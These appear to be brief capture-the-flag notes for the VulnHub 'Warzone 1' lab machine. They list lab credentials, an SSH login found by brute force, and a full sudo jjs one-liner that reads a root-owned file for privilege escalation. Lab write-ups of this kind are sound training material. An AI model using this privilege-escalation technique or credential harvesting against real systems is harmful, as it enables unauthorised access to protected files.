- URL: ```https://www.vulnhub.com/entry/warzone-1,589/```

- ftp anonymous
- /console
- GET·AUTH·CREDENTIALS
- http://192.168.0.110:5000/get/auth/credentials
- [22][ssh] host: 192.168.0.110   login: commando   password: c0mmandosArentRea1.!
- captain/Desktop
- captain password: ```_us3rz0ne_F1RE```
- sudo -l: jjs - read /root/.../.c
```echo 'var BufferedReader = Java.type("java.io.BufferedReader");
var FileReader = Java.type("java.io.FileReader");
var br = new BufferedReader(new FileReader("/root/Desktop/.crypt/.c"));
while ((line = br.readLine()) != null) { print(line); }' | sudo jjs
```
- b'c2MAArI9HzodWZVdjp8CL5Na/YetD8mpGmOR+zf0zmGeDy7KMsJ5YE3wNPSr4vCc5sV8w+BHq9yd5JHwGPKSuHClFqBUvhf/dSFUEKm9kG7/mPMPYg=='
- root password: ```#i.d0nt.l1ke.w4r#```
